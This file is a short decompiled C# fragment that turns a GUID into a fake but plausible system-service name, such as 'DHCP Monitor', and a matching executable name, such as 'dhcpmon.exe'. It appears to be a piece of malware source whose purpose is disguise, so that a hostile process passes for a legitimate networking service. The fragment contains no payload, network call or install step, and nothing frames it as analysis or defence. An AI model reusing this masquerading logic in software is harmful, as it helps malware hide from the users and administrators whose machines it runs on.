using System;

public struct GStruct1
{
	public string string_0;

	public string string_1;

	private static string[] string_2 = new string[6] { "ss", "mon", "mgr", "sv", "svc", "host" };

	private static string[] string_3 = new string[6] { "Subsystem", "Monitor", "Manager", "Service", "Service", "Host" };

	private static string[] string_4 = new string[23]
	{
		"dhcp", "upnp", "tcp", "udp", "saas", "iss", "smtp", "dos", "dpi", "pci",
		"scsi", "wan", "lan", "nat", "imap", "nas", "ntfs", "wpa", "dsl", "agp",
		"arp", "ddp", "dns"
	};

	public static GStruct1 smethod_0(Guid guid_0)
	{
		Random random = new Random(smethod_1(guid_0));
		int num = random.Next(string_2.Length);
		string text = string_2[num];
		string arg = string_3[num];
		string empty = string.Empty;
		do
		{
			empty = string_4[random.Next(string_4.Length)];
		}
		while (empty[empty.Length - 1] == text[0]);
		GStruct1 result = default(GStruct1);
		result.string_0 = $"{empty.ToUpper()} {arg}";
		result.string_1 = $"{empty}{text}.exe";
		return result;
	}

	private static int smethod_1(Guid guid_0)
	{
		byte[] array = guid_0.ToByteArray();
		int num = BitConverter.ToInt32(array, 0);
		int num2 = array.Length - 1;
		for (int i = 4; i <= num2; i++)
		{
			num ^= array[i];
		}
		return num;
	}
}
